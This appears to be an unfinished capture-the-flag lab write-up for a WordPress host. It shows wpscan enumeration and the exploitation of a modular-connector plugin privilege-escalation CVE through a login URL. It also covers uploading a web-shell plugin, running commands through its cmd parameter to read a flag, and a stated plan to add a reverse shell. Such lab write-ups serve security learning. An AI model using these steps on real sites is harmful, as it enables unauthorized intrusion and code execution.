---

Name: Dark
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/dark-easy
Description: You have been hired to perform a penetration test on a single host in a company's network. Your task is to identify all vulnerabilities and demonstrate impact to the client by elevating your privileges to root.

---

Looks like we have a wordpress site
```bash
$ whatweb http://10.1.123.49/
http://10.1.123.49/ [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.1.123.49], MetaGenerator[WordPress 6.0], Script, Title[Dark &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[6.0]

```
```txt
Learn to walk in the Dark.
The forest is quiet, the road is long, and the air is cold—
but each step sharpens your mind and strengthens your will.
You don’t need the full map—only the courage to take the next step.
That’s where confidence takes root.
```

```bash

[+] XML-RPC seems to be enabled: http://10.1.123.49/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/


```

There is only 1 username, found at http://10.1.123.49/?author=1
```txt
Author: streetcoderadmin
```

```bash
$ wpscan --url http://10.1.123.49 --api-token REDACTED --enumerate p --plugins-detection mixed
+] modular-connector
 | Location: http://10.1.123.49/wp-content/plugins/modular-connector/
 | Last Updated: 2026-07-30 9:26pm GMT (7 days ago, per WordPress.org)
 | Active Installs: 40,000 (per WordPress.org)
 | Readme: http://10.1.123.49/wp-content/plugins/modular-connector/readme.txt
 | [!] The version is out of date, the latest version is 3.1.0
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.1.123.49/wp-content/plugins/modular-connector/, status: 403
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Modular DS < 2.5.2 - Unauthenticated Privilege Escalation
 |     UUID: 3ccaa0fd-b11c-4f9f-bab5-644a53b11035
 |     Fixed in: 2.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/3ccaa0fd-b11c-4f9f-bab5-644a53b11035
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23550
 |      - https://patchstack.com/database/wordpress/plugin/modular-connector/vulnerability/wordpress-modular-ds-monitor-update-and-backup-multiple-websites-plugin-2-5-1-privilege-escalation-vulnerability
 |
 | [!] Title: Modular Connector < 2.6.0 - Cross-Site Request Forgery via postConfirmOauth
 |     UUID: fe2b101a-d065-4fc2-91d8-0a639bcc3f35
 |     Fixed in: 2.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/fe2b101a-d065-4fc2-91d8-0a639bcc3f35
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-3903
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/913a94ad-f425-4d24-9e23-7074ecfed8ad
 |
 | Version: 2.5.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.1.123.49/wp-content/plugins/modular-connector/readme.txt
```

We find a CVE that give us Unauthenticated Privilege Escalation, and read more about it [here](https://cvereports.com/reports/CVE-2026-23550)

We just have to go to
```http
http://target.com/api/modular-connector/login/{{random}}?origin=mo&type=1
```

We create a plugin and import it
<!--TODO - fix-->
```bash
 ✘  Fri  7 Aug - 18:24  /tmp 
 @theo  mkdir shell-plugin

 Fri  7 Aug - 18:24  /tmp 
 @theo  cd shell-plugin

 Fri  7 Aug - 18:24  /tmp/shell-plugin 
 @theo  nvim shell-plugin.php

 Fri  7 Aug - 18:24  /tmp/shell-plugin 
 @theo  lq
zsh: command not found: lq

 ✘  Fri  7 Aug - 18:24  /tmp/shell-plugin 
 @theo  cd ../

 Fri  7 Aug - 18:24  /tmp 
 @theo  zip shell.zip shell-plugin
  adding: shell-plugin/ (stored 0%)

 Fri  7 Aug - 18:24  /tmp 
 @theo  zip -r shell.zip shell-plugin
updating: shell-plugin/ (stored 0%)
  adding: shell-plugin/shell-plugin.php (stored 0%)

 Fri  7 Aug - 18:25  /tmp 
 @theo  unzip -l shell
Archive:  shell.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  08-07-2026 18:24   shell-plugin/
       53  08-07-2026 18:24   shell-plugin/shell-plugin.php
---------                     -------
       53                     2 files

```


We can now run commands
```bash
http://10.1.123.49/wp-content/plugins/shell-plugin/shell-plugin.php?cmd=id
```

And read the first flag
```
http://10.1.123.49/wp-content/plugins/shell-plugin/shell-plugin.php?cmd=cat%20/var/www/user.txt
```

I want to upload php pentest monkey revshell now
